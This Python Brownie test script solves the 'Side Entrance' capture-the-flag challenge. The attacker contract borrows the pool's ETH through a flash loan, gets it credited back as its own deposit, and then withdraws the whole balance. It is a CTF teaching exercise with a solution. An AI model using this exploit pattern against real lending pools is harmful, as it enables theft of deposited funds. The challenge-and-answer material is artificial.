from scripts.utils import *
from brownie import SideEntranceLenderPool

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # ether in pool
    ETHER_IN_POOL = ether_to_wei(100)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # deploy the contracts
    pool = SideEntranceLenderPool.deploy(_fromDeployer)

    # deposit into the pool
    pool.deposit(_fromDeployer | value_dict(ETHER_IN_POOL))

    # attacker initial ether balance
    ATTACKER_INITIAL_ETH_BALANCE = attacker.balance()

    # verify eth in pool
    assert pool.balance() == ETHER_IN_POOL

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        assert pool.balance() == 0
        assert attacker.balance() >= ATTACKER_INITIAL_ETH_BALANCE

# #########################################################
# A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
#
# This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
#
# You must take all ETH from the lending pool. 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################
    
    # import attacker contract
    from brownie import FlashLoanEtherReceiver

    # deploy attacker contract
    receiver = FlashLoanEtherReceiver.deploy(pool.address, _fromAttacker)

    # execute flashloan with 0 ether in the amount
    # which calls execute
    receiver.flashLoan(_fromAttacker)

    # withdraw all the ether that's credited to the attacker contract from the pool
    receiver.withdrawFromPool(_fromAttacker)

    ######################
    check_solution()
